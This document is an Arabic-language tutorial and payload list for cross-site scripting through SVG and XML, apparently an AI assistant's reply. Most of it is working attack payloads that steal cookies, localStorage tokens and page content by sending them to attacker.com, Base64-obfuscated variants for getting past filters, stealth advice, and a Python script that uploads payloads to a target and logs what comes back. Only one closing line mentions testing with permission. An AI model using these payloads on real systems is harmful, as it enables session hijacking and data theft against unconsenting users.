
## الخطوات العملية للحقن المستخدمة في SVG وXML
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة الناتجة عن الحقن.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المرسلة من الحقن.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من أن الموقع يدعم تحميل ملفات SVG/XML أو عرض محتوى هذه التنسيقات (مثل صور SVG أو بيانات XML في API).

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال تتيح إدخال أو عرض محتوى SVG/XML، مثل:
     - حقول تحميل الملفات (مثل صور الملف الشخصي).
     - حقول نصية تُعرض كجزء من الصفحة (مثل التعليقات أو الوصف).
     - معلمات URL التي تُعرض كمحتوى SVG/XML.
     - واجهات API التي تعالج بيانات XML.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد ما إذا كان يُسمح بوسوم SVG/XML دون تنظيف.
   - تحقق من دعم المتصفح للأحداث والوسوم (مثل `onload` في SVG أو `xlink:href` في XML).

3. **إدخال الحقن**:
   - أدخل شيفرة SVG أو XML تحتوي على JavaScript في نقطة الإدخال العرضة.
   - صمم الحقنة لتنفيذ شيفرة ضارة، مثل:
     - SVG: `<svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>`
     - XML: `<a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>`
   - جرب الحقن في سياقات مختلفة:
     - تحميل ملف SVG: أنشئ ملفًا بمحتوى `<svg><script>alert('XSS')</script></svg>` وقم بتحميله.
     - حقل نصي: أدخل `<svg onload="alert('XSS')"></svg>` في تعليق أو وصف.
     - معلمة URL: `https://example.com/?data=<svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>`
     - API XML: أرسل `<root><a xlink:href="javascript:alert('XSS')">Click</a></root>` عبر طلب POST.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات، والشبكة (Network) للطلبات الصادرة.
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تعديل الصفحة أو إعادة التوجيه.
   - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه، إرسال بيانات إلى الخادم، أو إعادة توجيه).
   - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، CSP، أو تنظيف الإدخال.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - SVG: استخدم أحداثًا مختلفة (مثل `onclick`، `onmouseover`) أو وسوم أخرى (مثل `<a>` أو `<foreignObject>`).
     - XML: استخدم XLink مع `javascript:`، أو أدرج شيفرة JavaScript داخل معالجات XML.
     - تجاوز الفلاتر: جرب صيغ بديلة مثل `<SVG ONLOAD=alert('XSS')>` (حروف كبيرة) أو تعتيم الشيفرة.
   - اختبر نقاط إدخال متعددة (مثل حقول نصية أخرى، تحميل ملفات، أو واجهات API).
   - جرب حقنًا مع إرسال بيانات مختلفة (مثل `document.domain`، `localStorage`).

6. **تأكيد السياق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<svg onload="fetch('http://attacker.com/log?d='+document.domain)"></svg>`).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - سرقة بيانات حساسة (مثل `localStorage.getItem('token')`).
     - التلاعب بالصفحة (مثل إنشاء نموذج مزيف).
     - تنفيذ إجراءات المستخدم (مثل إرسال طلبات POST).
   - حافظ على التخفي بتجنب التنبيهات البصرية إذا كنت تستهدف سياقات حساسة.

---

## جميع المحاولات الممكنة للحقن المستخدمة في SVG وXML
في الحقن المستخدمة في SVG وXML، المحاولات تركز على إدراج JavaScript داخل هياكل SVG أو XML لتنفيذ شيفرات ضارة. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في حقول النماذج، معلمات URL، تحميل ملفات، أو واجهات API. الهدف هو تنفيذ JavaScript عبر SVG/XML.

#### أ. حقن SVG باستخدام وسم `<script>`
{ #XSS_Idea_for_script_tag /  #XSS_Idea_for_SVG_tag  / }
إدراج شيفرة JavaScript داخل وسم `<script>` في SVG.
- **الحقن**: `<svg><script>alert('XSS')</script></svg>`
  - **الإدخال**: أدخل في حقل نصي: `<svg><script>alert('XSS')</script></svg>` أو قم بتحميل ملف SVG.
  - **كيف يعمل**: ينفذ تنبيهًا عند عرض SVG.
  - **متى يُستخدم؟**: لتأكيد وجود ثغرة XSS.
- **الحقن**: `<svg><script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script></svg>`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<svg><script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script></svg>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة بيانات الجلسة.
- **الحقن**: `<svg><script>document.location='http://attacker.com'</script></svg>`
  - **الإدخال**: `https://example.com/?data=<svg><script>document.location='http://attacker.com'</script></svg>`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار.
  - **متى يُستخدم؟**: لإعادة التوجيه الخبيث.
- **الحقن**: `<svg><script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script></svg>`
  - **الإدخال**: قم بتحميل ملف SVG يحتوي على: `<svg><script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script></svg>`
  - **كيف يعمل**: يرسل محتوى الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<svg><script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script></svg>`
  - **الإدخال**: أدخل في حقل تعليق: `<svg><script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script></svg>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ب. حقن SVG باستخدام الأحداث
{ #XSS_Idea_for_SVG_tag / #XSS--ALL--Event--Payload  }
استخدام أحداث SVG (مثل `onload`، `onclick`) لتنفيذ JavaScript.
- **الحقن**: `<svg onload="alert('XSS')"></svg>`
  - **الإدخال**: أدخل في حقل نصي: `<svg onload="alert('XSS')"></svg>`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل SVG.
  - **متى يُستخدم؟**: لتأكيد الثغرة بسرعة.
- **الحقن**: `<svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>`
  - **الإدخال**: `https://example.com/?data=<svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل SVG.
  - **متى يُستخدم؟**: لسرقة البيانات تلقائيًا.
- **الحقن**: `<svg onclick="fetch('http://attacker.com/log?d='+document.domain)"></svg>`
  - **الإدخال**: أدخل في وصف: `<svg onclick="fetch('http://attacker.com/log?d='+document.domain)"></svg>`
  - **كيف يعمل**: يرسل النطاق عند النقر على SVG.
  - **متى يُستخدم؟**: لتتبع التفاعل.
- **الحقن**: `<svg onmouseover="new Image().src='http://attacker.com/log?l='+window.location.href"></svg>`
  - **الإدخال**: قم بتحميل ملف SVG يحتوي على: `<svg onmouseover="new Image().src='http://attacker.com/log?l='+window.location.href"></svg>`
  - **كيف يعمل**: يرسل عنوان URL عند تمرير المؤشر.
  - **متى يُستخدم؟**: لتتبع حركة المستخدم.
- **الحقن**: `<svg><rect onload="alert('XSS')"></rect></svg>`
  - **الإدخال**: أدخل في حقل تعليق: `<svg><rect onload="alert('XSS')"></rect></svg>`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل عنصر داخل SVG.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<svg>` مباشرة.

#### ج. حقن SVG باستخدام XLink
{ #XSS_Idea_for_SVG_tag / #ideas_for_url  }
استخدام روابط XLink في SVG لتنفيذ JavaScript.
- **الحقن**: `<svg><a xlink:href="javascript:alert('XSS')"><text>Click</text></a></svg>`
  - **الإدخال**: أدخل في حقل نصي: `<svg><a xlink:href="javascript:alert('XSS')"><text>Click</text></a></svg>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر على النص.
  - **متى يُستخدم؟**: لتجاوز فلاتر HTML.
- **الحقن**: `<svg><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)"><text>Click</text></a></svg>`
  - **الإدخال**: قم بتحميل ملف SVG يحتوي على: `<svg><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)"><text>Click</text></a></svg>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات عند التفاعل.
- **الحقن**: `<svg><image xlink:href="javascript:alert('XSS')"></image></svg>`
  - **الإدخال**: أدخل في وصف: `<svg><image xlink:href="javascript:alert('XSS')"></image></svg>`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز قيود `<a>`.
- **الحقن**: `<svg><a xlink:href="javascript:document.location='http://attacker.com'"><text>Click</text></a></svg>`
  - **الإدخال**: `https://example.com/?data=<svg><a xlink:href="javascript:document.location='http://attacker.com'"><text>Click</text></a></svg>`
  - **كيف يعمل**: يعيد توجيه المستخدم عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `<svg><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})"><text>Click</text></a></svg>`
  - **الإدخال**: أدخل في حقل تعليق: `<svg><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})"><text>Click</text></a></svg>`
  - **كيف يعمل**: يرسل محتوى الصفحة عند النقر.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.

#### د. حقن XML باستخدام XLink
{ #XSS_idea_XML /   #ideas_for_url }
إدراج JavaScript عبر روابط XLink في XML.
- **الحقن**: `<root><a xlink:href="javascript:alert('XSS')">Click</a></root>`
  - **الإدخال**: أرسل عبر طلب POST إلى API: `<root><a xlink:href="javascript:alert('XSS')">Click</a></root>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر إذا عُرض الـ XML في المتصفح.
  - **متى يُستخدم؟**: لاختبار واجهات API XML.
- **الحقن**: `<root><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a></root>`
  - **الإدخال**: أدخل في حقل يعالج XML: `<root><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a></root>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات.
- **الحقن**: `<root><element xlink:href="javascript:document.location='http://attacker.com'">Click</element></root>`
  - **الإدخال**: أرسل عبر API: `<root><element xlink:href="javascript:document.location='http://attacker.com'">Click</element></root>`
  - **كيف يعمل**: يعيد توجيه المستخدم عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `<root><a xlink:href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a></root>`
  - **الإدخال**: أدخل في حقل XML: `<root><a xlink:href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a></root>`
  - **كيف يعمل**: يرسل النطاق عند النقر.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<root><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a></root>`
  - **الإدخال**: أرسل عبر طلب POST: `<root><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a></root>`
  - **كيف يعمل**: يرسل رمز الجلسة عند النقر.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### هـ. حقن مع التعتيم
{ #ideas_for_url /  #XSS_ecoded_payload /  #XSS_idea_XML / #XSS_Idea_for_SVG_tag }
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<svg><script>eval(atob('YWxlcnQoJ1hTUycp'))</script></svg>`
  - **الإدخال**: أدخل في حقل نصي: `<svg><script>eval(atob('YWxlcnQoJ1hTUycp'))</script></svg>`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF.
- **الحقن**: `<svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))"></svg>`
  - **الإدخال**: قم بتحميل ملف SVG يحتوي على: `<svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))"></svg>`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجنب أنظمة الكشف.
- **الحقن**: `<svg><script>document['location']='http://attacker.com'</script></svg>`
  - **الإدخال**: أدخل في وصف: `<svg><script>document['location']='http://attacker.com'</script></svg>`
  - **كيف يعمل**: يستخدم صيغة غير قياسية لإعادة التوجيه.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.
- **الحقن**: `<svg><a xlink:href="javascript:alert(String.fromCharCode(88,83,83))"><text>Click</text></a></svg>`
  - **الإدخال**: أدخل في حقل تعليق: `<svg><a xlink:href="javascript:alert(String.fromCharCode(88,83,83))"><text>Click</text></a></svg>`
  - **كيف يعمل**: ينشئ تنبيهًا باستخدام رموز ASCII.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص المباشرة.
- **الحقن**: `<root><a xlink:href="javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">Click</a></root>`
  - **الإدخال**: أرسل عبر API: `<root><a xlink:href="javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">Click</a></root>`
  - **كيف يعمل**: يفك تشفير Base64 في XML ويرسل البيانات.
  - **متى يُستخدم؟**: لتجاوز فلاتر XML.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة في SVG وXML وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستخدم SVG وXML.
  - مثال قائمة:
    ```
    <svg><script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script></svg>
    <svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>
    <svg><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)"><text>Click</text></a></svg>
    <root><a xlink:href="javascript:alert('XSS')">Click</a></root>
    <svg><script>eval(atob('YWxlcnQoJ1hTUycp'))</script></svg>
    ```
- **كيف يعمل**:
  - يتم إرسال الحقن عبر نقاط إدخال (مثل حقول نصية، تحميل ملفات، أو API).
  - يتم مراقبة الخادم الخارجي أو المتصفح لتأكيد التنفيذ.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع تحميل ملفات SVG وإرسال XML):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<svg><script>fetch('http://localhost:8000/log?c='+encodeURIComponent(document.cookie))</script></svg>",
      "<svg onload=\"fetch('http://localhost:8000/log?c='+document.cookie)\"></svg>",
      "<svg><a xlink:href=\"javascript:fetch('http://localhost:8000/log?c='+document.cookie)\"><text>Click</text></a></svg>",
      "<root><a xlink:href=\"javascript:alert('XSS')\">Click</a></root>",
      "<svg><script>eval(atob('YWxlcnQoJ1hTUycp'))</script></svg>"
  ]

  target_url = "https://example.com/upload-svg"
  for payload in payloads:
      try:
          # محاكاة تحميل ملف SVG
          files = {'file': ('test.svg', payload, 'image/svg+xml')}
          requests.post(target_url, files=files)
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن كملفات SVG أو بيانات XML إلى نقاط إدخال.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لتحميل ملفات أو نقاط إدخال.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **وحدة التحكم**: تحقق من ظهور تنبيهات أو أخطاء في Console.
    - **تغييرات DOM**: تحقق من إعادة التوجيه أو تعديل الصفحة.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<svg><foreignObject onload="alert('XSS')"></foreignObject></svg>`).
  - جرب أحداث SVG أخرى (مثل `onbegin`، `onend`).
  - اختبر XML مع هياكل أخرى (مثل CDATA أو معالجات DTD).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<svg><animate onbegin="fetch('http://attacker.com/log?c='+document.cookie)"></animate></svg>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن SVG باستخدام وسم <script>:
- <svg><script>alert('XSS')</script></svg>: ينفذ تنبيهًا عند عرض SVG.
- <svg><script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script></svg>: يرسل ملفات تعريف الارتباط.
- <svg><script>document.location='http://attacker.com'</script></svg>: يعيد توجيه المستخدم.
- <svg><script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script></svg>: يرسل محتوى الصفحة.
- <svg><script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script></svg>: يرسل رمز الجلسة.

2. حقن SVG باستخدام الأحداث:
- <svg onload="alert('XSS')"></svg>: ينفذ تنبيهًا عند تحميل SVG.
- <svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>: يرسل ملفات تعريف الارتباط تلقائيًا.
- <svg onclick="fetch('http://attacker.com/log?d='+document.domain)"></svg>: يرسل النطاق عند النقر.
- <svg onmouseover="new Image().src='http://attacker.com/log?l='+window.location.href"></svg>: يرسل عنوان URL عند تمرير المؤشر.
- <svg><rect onload="alert('XSS')"></rect></svg>: ينفذ تنبيهًا داخل عنصر SVG.

3. حقن SVG باستخدام XLink:
- <svg><a xlink:href="javascript:alert('XSS')"><text>Click</text></a></svg>: ينفذ تنبيهًا عند النقر.
- <svg><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)"><text>Click</text></a></svg>: يرسل ملفات تعريف الارتباط عند النقر.
- <svg><image xlink:href="javascript:alert('XSS')"></image></svg>: ينفذ تنبيهًا عند تحميل الصورة.
- <svg><a xlink:href="javascript:document.location='http://attacker.com'"><text>Click</text></a></svg>: يعيد توجيه المستخدم.
- <svg><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})"><text>Click</text></a></svg>: يرسل محتوى الصفحة.

4. حقن XML باستخدام XLink:
- <root><a xlink:href="javascript:alert('XSS')">Click</a></root>: ينفذ تنبيهًا عند النقر.
- <root><a xlink:href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a></root>: يرسل ملفات تعريف الارتباط.
- <root><element xlink:href="javascript:document.location='http://attacker.com'">Click</element></root>: يعيد توجيه المستخدم.
- <root><a xlink:href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a></root>: يرسل النطاق.
- <root><a xlink:href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a></root>: يرسل رمز الجلسة.

5. حقن مع التعتيم:
- <svg><script>eval(atob('YWxlcnQoJ1hTUycp'))</script></svg>: يفك تشفير Base64 لتنفيذ تنبيه.
- <svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))"></svg>: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <svg><script>document['location']='http://attacker.com'</script></svg>: يستخدم صيغة غير قياسية.
- <svg><a xlink:href="javascript:alert(String.fromCharCode(88,83,83))"><text>Click</text></a></svg>: يستخدم رموز ASCII.
- <root><a xlink:href="javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">Click</a></root>: يفك تشفير Base64 في XML.



---

**نصائح إضافية**:
- **اختبار توافق المتصفح**: تأكد من اختبار الحقن في متصفحات مختلفة (مثل Chrome، Firefox، Safari) لأن دعم SVG/XML قد يختلف.
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو `ngrok` لتسجيل البيانات، وتأكد من دعم طلبات GET وPOST.
- **تجاوز الفلاتر**: جرب تغيير حالة الأحرف (مثل `<SVG>` بدلاً من `<svg>`)، استخدام أحداث غير شائعة، أو تعتيم الشيفرة لتجنب فلاتر XSS.
- **اختبار نقاط الإدخال**: ركز على نقاط مثل تحميل الملفات، حقول النصوص، وواجهات API التي تعالج SVG/XML.
- **الأدوات**: استخدم **Burp Suite** لمراقبة الطلبات، **XSStrike** لتوليد الحقن، أو **Selenium** لمحاكاة التفاعل مع الحقن.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل SVG في تطبيقات معينة)، أخبرني وسأقدم ردًا مخصصًا!